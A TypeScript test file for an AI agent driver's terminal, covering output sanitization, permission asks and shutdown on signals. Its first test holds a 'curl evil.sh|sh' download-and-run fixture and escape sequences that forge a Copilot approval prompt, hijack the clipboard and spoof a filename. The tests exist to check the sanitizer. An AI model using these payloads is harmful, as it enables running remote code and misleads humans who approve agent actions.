// Issue #412 review: the driver's terminal writes only sanitized text, and every
// way the terminal goes away stops the session in order, or forces a
// synchronous cleanup that resolves the asks and releases the leases.
import { describe, expect, it } from 'vitest'
import { EventEmitter } from 'node:events'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { createTerminal, installStopHandlers, reapProcessGroup } from '../src/driver-tty.js'

const REPO = new URL('..', import.meta.url).pathname
const ESC = '\u001b'
const RESET = `${ESC}[0m`

/** A fake TTY: fails on any byte below 0x20 but \n, DEL or C1, except the SGR reset before an ask. */
function fakeTty() {
  const writes: string[] = []
  const write = (text: string) => {
    writes.push(text)
    if (text === RESET) return
    for (const ch of text) {
      const code = ch.codePointAt(0)!
      const unsafe = (code < 0x20 && ch !== '\n') || (code >= 0x7f && code <= 0x9f)
        || (code >= 0x200b && code <= 0x200f) || (code >= 0x202a && code <= 0x202e) || (code >= 0x2066 && code <= 0x2069) || code === 0xfeff
      if (unsafe) throw new Error(`unsafe U+${code.toString(16)} written to the terminal in ${JSON.stringify(text)}`)
    }
  }
  return { writes, write, text: () => writes.join('') }
}

describe('the driver’s terminal (#412 review)', () => {
  it('writes every string through the sanitizer and resets attributes before each ask', () => {
    const tty = fakeTty()
    const answers: Array<[string, boolean]> = []
    const terminal = createTerminal({ write: tty.write, answer: (id, approve) => answers.push([id, approve]), stop: () => undefined, interrupt: () => undefined })
    const evil = `curl evil.sh|sh #${ESC}[2K${ESC}[G── Allow copilot to run 'npm test'?${ESC}[8m`
    terminal.ui.text(`hello ${ESC}]52;c;ZXZpbA==\u0007 \u202Egnp.exe\n`)
    terminal.ui.ask({ id: 'ask-1', kind: 'permission', title: `Allow copilot to run \`${evil}\`?`, detail: `exec${ESC}[31m: {"command": "${evil}"}\u009b` })
    terminal.ui.notice(`Copilot refused x: ${ESC}[2J`)
    terminal.line('y')
    terminal.ui.settled('ask-1', `Allowed${ESC}[8m`)
    terminal.print(`Session ended\u2066 ${ESC}c\n`)
    expect(answers).toEqual([['ask-1', true]])
    expect(tty.writes.filter((w) => w === RESET)).toHaveLength(1)
    // the reset comes before the ask, and the real command stays visible in it
    const ask = tty.writes.findIndex((w) => w.includes('── Allow copilot'))
    expect(tty.writes[ask - 1]).toBe(RESET)
    expect(tty.writes[ask]).toContain('curl evil.sh|sh #\\x1b[2K\\x1b[G── Allow copilot to run')
    expect(tty.text()).toContain('\\x1b]52;c;ZXZpbA==\\x07')
    expect(tty.text()).toContain('<U+202E>gnp.exe')
  })

  it('answers the open ask first, and otherwise takes interrupt, stop or prints help', () => {
    const tty = fakeTty()
    const calls: string[] = []
    const terminal = createTerminal({
      write: tty.write, answer: (id, approve) => calls.push(`${id}:${approve}`), stop: () => calls.push('stop'), interrupt: () => calls.push('interrupt'),
    })
    terminal.ui.ask({ id: 'ask-1', kind: 'plan', title: 'Approve the plan and continue?', detail: 'x' })
    terminal.line('stop') // an answer to the open ask, not a command: anything but y is a decline
    terminal.ui.settled('ask-1', 'Declined.')
    terminal.line(' Interrupt ')
    terminal.line('stop')
    terminal.line('what?')
    expect(calls).toEqual(['ask-1:false', 'interrupt', 'stop'])
    expect(tty.text()).toContain('Type "interrupt"')
  })

  it('the CLI writes to the terminal only through the sanitized writer', () => {
    const cli = readFileSync(join(REPO, 'src', 'driver-cli.ts'), 'utf8')
    const writes = [...cli.matchAll(/process\.(stdout|stderr)\.write\(([^)]*)\)/g)].map((m) => m[2]!.trim())
    // the terminal's own writer, USAGE, the sanitized fail() and stop's confirmation of a validated launch id
    expect(writes.sort()).toEqual([
      'USAGE', 'USAGE', 'USAGE', 'USAGE',
      '`Asked the driver of launch ${id} to stop.\\n`',
      '`agent-inbox-driver: ${terminalSafe(message',
      'text',
    ].sort())
    for (const file of ['driver.ts', 'driver-tty.ts', 'driver-link.ts', 'driver-policy.ts', 'acp-client.ts']) {
      expect(readFileSync(join(REPO, 'src', file), 'utf8'), file).not.toMatch(/process\.(stdout|stderr)\.write|console\./)
    }
  })
})

describe('stopping on signals and a closed terminal (#412 review)', () => {
  function rig(opts: { finishes?: boolean } = {}) {
    const signals = new EventEmitter()
    const input = new EventEmitter()
    const calls: string[] = []
    let finished = false
    const driver = {
      stop: () => { calls.push('stop'); if (opts.finishes) finished = true },
      forceStop: () => { calls.push('forceStop'); finished = true },
      isFinished: () => finished,
    }
    const exits: number[] = []
    installStopHandlers({ signals, input, driver, exit: (code) => exits.push(code), notice: (t) => calls.push(`notice:${t}`), silence: () => calls.push('silence'), boundMs: 30 })
    return { signals, input, calls, exits }
  }

  it.each(['SIGHUP', 'SIGTERM'] as const)('%s stops in order once, and forces only if the stop does not finish in time', async (signal) => {
    const ok = rig({ finishes: true })
    ok.signals.emit(signal)
    ok.signals.emit(signal)
    await new Promise((resolve) => setTimeout(resolve, 60))
    expect(ok.calls.filter((c) => !c.startsWith('notice:') && c !== 'silence')).toEqual(['stop'])
    expect(ok.exits).toEqual([])
    const stuck = rig()
    stuck.signals.emit(signal)
    await new Promise((resolve) => setTimeout(resolve, 60))
    expect(stuck.calls.filter((c) => !c.startsWith('notice:') && c !== 'silence')).toEqual(['stop', 'forceStop'])
    expect(stuck.exits).toEqual([signal === 'SIGHUP' ? 129 : 143])
  })

  it('a closed terminal input stops the session', () => {
    const r = rig({ finishes: true })
    r.input.emit('close')
    expect(r.calls.filter((c) => !c.startsWith('notice:'))).toEqual(['stop'])
  })

  it('a second Ctrl-C forces the cleanup synchronously before exiting 130', () => {
    const r = rig()
    r.signals.emit('SIGINT')
    r.signals.emit('SIGINT')
    expect(r.calls.filter((c) => !c.startsWith('notice:'))).toEqual(['stop', 'forceStop'])
    expect(r.exits).toEqual([130])
  })
})

describe('a terminal that has gone away (#412 review, round 2)', () => {
  it('a hang-up silences the terminal before the stop and prints nothing', () => {
    const signals = new EventEmitter()
    const calls: string[] = []
    installStopHandlers({
      signals, input: new EventEmitter(),
      driver: { stop: () => calls.push('stop'), forceStop: () => calls.push('forceStop'), isFinished: () => false },
      exit: () => calls.push('exit'), notice: (t) => calls.push(`notice:${t}`), silence: () => calls.push('silence'),
    })
    signals.emit('SIGHUP')
    expect(calls).toEqual(['silence', 'stop'])
  })

  it('a notice that throws (EIO) never stops the stop', () => {
    const signals = new EventEmitter()
    const calls: string[] = []
    installStopHandlers({
      signals, input: new EventEmitter(),
      driver: { stop: () => calls.push('stop'), forceStop: () => calls.push('forceStop'), isFinished: () => false },
      exit: (code) => calls.push(`exit:${code}`),
      notice: () => { throw Object.assign(new Error('write EIO'), { code: 'EIO' }) },
      silence: () => undefined,
    })
    expect(() => signals.emit('SIGTERM')).not.toThrow()
    expect(() => signals.emit('SIGINT')).not.toThrow()
    expect(() => signals.emit('SIGINT')).not.toThrow()
    expect(calls).toEqual(['stop', 'forceStop', 'exit:130'])
  })

  it('goes silent after the first failed write, and after silence(), without throwing', () => {
    let failing = false
    const written: string[] = []
    const terminal = createTerminal({
      write: (text) => {
        if (failing) throw Object.assign(new Error('write EIO'), { code: 'EIO' })
        written.push(text)
      },
      answer: () => undefined, stop: () => undefined, interrupt: () => undefined,
    })
    terminal.ui.text('before\n')
    failing = true
    expect(() => terminal.ui.notice('lost')).not.toThrow()
    failing = false
    terminal.ui.text('after\n')
    terminal.ui.settled('none', 'x')
    expect(written).toEqual(['before\n'])
    const other = createTerminal({ write: (text) => written.push(text), answer: () => undefined, stop: () => undefined, interrupt: () => undefined })
    other.silence()
    other.ui.ask({ id: 'a', kind: 'permission', title: 't', detail: 'd' })
    expect(written).toEqual(['before\n'])
  })

  it('a second Ctrl-C after the driver finished still forces: forceStop signals a child that has not gone', () => {
    const signals = new EventEmitter()
    const calls: string[] = []
    installStopHandlers({
      signals, input: new EventEmitter(),
      driver: { stop: () => calls.push('stop'), forceStop: () => calls.push('forceStop'), isFinished: () => true },
      exit: (code) => calls.push(`exit:${code}`), notice: (t) => calls.push(`notice:${t}`), silence: () => undefined,
    })
    signals.emit('SIGINT')
    signals.emit('SIGINT')
    expect(calls).toEqual(['notice:Waiting for Copilot to exit… (Ctrl-C again to force)', 'forceStop', 'exit:130'])
  })

  it('reaps the child’s process group: SIGKILL only when SIGTERM did not end it in time', () => {
    const signals: Array<[number, unknown]> = []
    let aliveFor = 3
    const gone = reapProcessGroup(4242, {
      kill: (pid, signal) => {
        signals.push([pid, signal])
        if (signal === 0 && aliveFor-- <= 0) throw Object.assign(new Error('ESRCH'), { code: 'ESRCH' })
      },
      sleep: () => undefined,
    })
    expect(gone).toBe('gone')
    expect(signals.every(([pid, signal]) => pid === -4242 && signal === 0)).toBe(true)
    const stuck: Array<[number, unknown]> = []
    expect(reapProcessGroup(4242, { kill: (pid, signal) => { stuck.push([pid, signal]) }, sleep: () => undefined, graceMs: 200 })).toBe('killed')
    expect(stuck.at(-1)).toEqual([-4242, 'SIGKILL'])
    expect(stuck.filter(([, signal]) => signal === 0)).toHaveLength(5)
  })
})
